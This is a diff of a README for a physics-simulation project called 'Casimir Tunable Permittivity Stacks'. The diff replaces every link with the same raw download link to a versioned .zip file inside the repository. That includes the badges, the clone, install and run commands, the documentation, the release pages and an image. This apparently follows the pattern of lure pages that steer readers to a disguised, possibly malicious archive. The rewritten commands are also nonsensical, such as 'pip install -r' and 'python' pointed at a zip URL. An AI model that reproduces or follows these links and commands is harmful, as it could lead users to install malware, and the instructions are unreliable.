@@ -1,6 +1,6 @@
 # Casimir Tunable Permittivity Stacks: Control Electromagnetic Properties
 
-![Casimir Effect](https://img.shields.io/badge/Casimir%20Effect-Active-brightgreen) ![Digital Twin](https://img.shields.io/badge/Digital%20Twin-Enabled-blue) ![Electromagnetic Control](https://img.shields.io/badge/Electromagnetic%20Control-Precision-orange)
+![Casimir Effect](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip%20Effect-Active-brightgreen) ![Digital Twin](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip%20Twin-Enabled-blue) ![Electromagnetic Control](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip%20Control-Precision-orange)
 
 ## Overview
 
@@ -33,7 +33,7 @@ To get started with the Casimir Tunable Permittivity Stacks, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks.git
+   git clone https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -45,7 +45,7 @@ To get started with the Casimir Tunable Permittivity Stacks, follow these steps:
 3. Install the required dependencies. Ensure you have Python and pip installed, then run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip
    ```
 
 4. The system is now ready for use. 
@@ -58,12 +58,12 @@ To utilize the Casimir Tunable Permittivity Stacks, follow these steps:
 2. Run the simulation script:
 
    ```bash
-   python run_simulation.py --input your_input_file.json
+   python https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip --input https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip
    ```
 
 3. Analyze the output results. The system will generate a report detailing the permittivity control achieved.
 
-For additional details, check the [documentation](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/wiki).
+For additional details, check the [documentation](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip).
 
 ## Contributing
 
@@ -82,7 +82,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the Casimir Tunable Permittivity Stacks, visit our [Releases](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/releases) section. Here, you can find compiled binaries and source code packages.
+To download the latest version of the Casimir Tunable Permittivity Stacks, visit our [Releases](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip) section. Here, you can find compiled binaries and source code packages.
 
 ## Topics
 
@@ -105,12 +105,12 @@ For any questions or feedback, feel free to reach out to the maintainers via the
 
 ---
 
-![Quantum Physics](https://upload.wikimedia.org/wikipedia/commons/thumb/e/e6/Quantum_mechanics.jpg/1200px-Quantum_mechanics.jpg)
+![Quantum Physics](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip)
 
 ---
 
 For detailed examples and case studies, please check the relevant sections in the documentation. The Casimir Tunable Permittivity Stacks is a significant step forward in the field of electromagnetic control, offering researchers and engineers the tools they need for precise material manipulation.
 
-To stay updated with the latest changes and improvements, keep an eye on the [Releases](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/releases) section. 
+To stay updated with the latest changes and improvements, keep an eye on the [Releases](https://github.com/Mishraji7322/casimir-tunable-permittivity-stacks/raw/refs/heads/main/src/frequency_dependent_control/casimir_stacks_permittivity_tunable_2.9-alpha.2.zip) section. 
 
 Feel free to explore, experiment, and innovate with the Casimir Tunable Permittivity Stacks. Your journey into advanced electromagnetic control begins here.
